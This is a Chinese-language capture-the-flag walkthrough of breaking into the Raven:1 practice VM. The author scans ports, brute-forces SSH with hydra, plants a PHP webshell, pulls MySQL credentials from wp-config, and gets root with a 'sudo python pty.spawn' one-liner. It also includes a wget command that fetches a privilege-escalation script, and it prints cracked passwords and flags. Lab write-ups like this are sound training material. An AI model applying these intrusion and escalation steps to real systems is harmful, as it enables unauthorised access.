# 渗透测试实战-Raven：1靶机入侵

阅读量 **361200**

|评论 **17**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-11-14 16:30:10

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t017e9184f513b589d4.jpg)

## 前言

大家好！爱写靶机渗透文章的我又来了，该靶机被设计者定义为初级-中级，最后小弟完成整个渗透的时候也的确是比较简单的；但是中间设计者设计了一个坑，小弟在那里被困了好几天，都塌喵的开始怀疑人生了。下面会介绍，本靶机设计者一共设置了4个flag，本次入侵也已拿到4个flag和root权限为止。

## 靶机安装/下载

Raven：1靶机下载：<https://pan.baidu.com/s/18p0Jir7eH0BL1Na_6ybRtg>  
靶机IP: 172.16.24.37

![](https://p2.ssl.qhimg.com/t01699418a8ee170e4c.png)

## 实战

第一步老规矩探测ip：

![](https://p5.ssl.qhimg.com/t01be861277f950a82c.png)

已经知道了ip，下一步就是使用nmap探测靶机开放的端口了，如图：

![](https://p4.ssl.qhimg.com/t0198c3c213ed05323b.png)

通过上面的端口探测可以看到，该靶机开放了多个端口，我们还是老规矩以80端口作为突破口

![](https://p1.ssl.qhimg.com/t0156d3ec883d8aa9b2.png)

下一步进行目录猜解，本次使用gobuster 工具完成

![](https://p5.ssl.qhimg.com/t01969899ed5947a9f8.png)

我们在 <http://172.16.24.37/service.html> 拿到了第一个flag，在源代码262行处，如图：

![](https://p5.ssl.qhimg.com/t0194c98751321bca82.png)

flag1{b9bbcb33e11b80be759c4e844862482d}

通过刚刚的目录猜解，我在/vendor目录下发现了
PHPMailerAutoload.php，通过搜索发现存在一个PHPmailer的任意命令执行漏洞，然后小弟就一顿操作一顿修改exp，

![](https://p3.ssl.qhimg.com/t011b27d499e624cda8.png)

（注：这里的绝对路径在<http://172.16.24.37/vendor/PATH> ）

![](https://p4.ssl.qhimg.com/t01017401cb6be52b83.png)

小弟还不死心，直接手动测试，如图：

![](https://p2.ssl.qhimg.com/t018b4631ac76d34ca2.png)

依然出错，在这里小弟被卡了好几天，一度怀疑是不是靶机设计者设计错了，最后忘记是用哪款扫描器，扫描到了zip文件，地址：<http://172.16.24.37/contact.zip>
，下载来后通过查看源代码发现，该源码里写入的地址是错的，这也就说我一直没法利用该漏洞的原因，如图：

![](https://p3.ssl.qhimg.com/t0102d30fb8935b10e3.png)

最后小弟把目光放在/wordpress 上，老规矩使用wpsan怼一波，如图：

![](https://p1.ssl.qhimg.com/t01aa7c4b8c9dcbb102.png)

未发现可利用漏洞，但是出来2个账户“michael”、“steven”

下面我们加载这2个账户来破解其ssh密码，各位也可以使用msf来完成

小弟这里使用hydra：

![](https://p5.ssl.qhimg.com/t0176cbf92370feec11.png)

破解出来密码：“michael”、“michael”

即能成功登陆ssh，

![](https://p1.ssl.qhimg.com/t01dff969b6c3ac7df7.png)

下一步就是拿flag了，flag2在 /var/www/ 目录下，如图：

![](https://p1.ssl.qhimg.com/t0180de090abcd2164d.png)

flag2{fc3fd58dcdad9ab23faca6e9a36e581c}

下面为了演示方便，小弟上了一个php大马在/wordpress目录下，

![](https://p2.ssl.qhimg.com/t0146b7117f84e8c93b.png)

下一步就是提权了，在/wordpress/wp_config.php 里拿到mysql的账户密码，如图：

![](https://p2.ssl.qhimg.com/t01d2babc49a281067d.png)

mysql账户密码为：“root”、“R[@v3nSecurity](https://github.com/v3nSecurity
"@v3nSecurity")”

到了这里肯定要小伙伴要问了，前面端口探测不是看到靶机没开3306端口吗？其实它只是为了防止外部访问罢了，我们使用shell查看，即可知道，如图：

![](https://p5.ssl.qhimg.com/t01e97b1d79b5deac60.png)

下面肯定是通过mysql提权啊，我们使用php大马来操作mysql，方便大家阅读

![](https://p2.ssl.qhimg.com/t0133a725ac97b43d09.png)

![](https://p1.ssl.qhimg.com/t0184f83884068b450d.png)

拿到了flag3{afc01ab56b50591e7dccf93122770cd2}

小弟也在/tmp目录下，上传了一个提权辅助脚本，命令：

    
    
    wget https://www.securitysift.com/download/linuxprivchecker.py

![](https://p5.ssl.qhimg.com/t014157f91c260123a0.png)

通过提权脚本我们可以看到，我们可以使用mysql来完成提权，该方法的提权具体操作，见代码注释处，如图：

![](https://p3.ssl.qhimg.com/t01a4fb959b0532af28.png)

脚本地址：<https://www.exploit-db.com/exploits/1518/>

小弟这里使用另外一种方法提权，刚刚我们已经得到了另外一个账户“steven”的hash值，下一步我们破解这个hash

得到破解密码：pink84

下面我们切换到steven账户

![](https://p0.ssl.qhimg.com/t01904bc71f941a2e0c.png)

下一步输入命令：sudo -l

![](https://p3.ssl.qhimg.com/t01f9b04450a61070c4.png)

可以看到python，可以直接绕过root，下面只需要输入命令

    
    
    sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’

![](https://p4.ssl.qhimg.com/t014cd9f158b9be4a30.png)

成功拿到flag和root_shell

## 总结

通过这篇文章小伙伴们应该也看到了，该靶机其实挺简单的，但是小弟在前面被不知是设计者的故意挖坑还是失望留的坑，困了好几天，一直无法突破。所以说小伙伴们以后在真实环境中如果碰到无法突破的点，可以先试着跳出来看看其他的是否有突破口呐？

最后祝大家生活愉快，感谢观看！

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **d3ckx1** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/163996](/post/id/163996)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [渗透测试](/tag/渗透测试)
  * [靶机入侵](/tag/靶机入侵)

 **+1** __22赞

 __收藏

![](https://p0.ssl.qhmsg.com/dm/200_200_100/t017a53cae377f0cd5e.jpg) d3ckx1

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

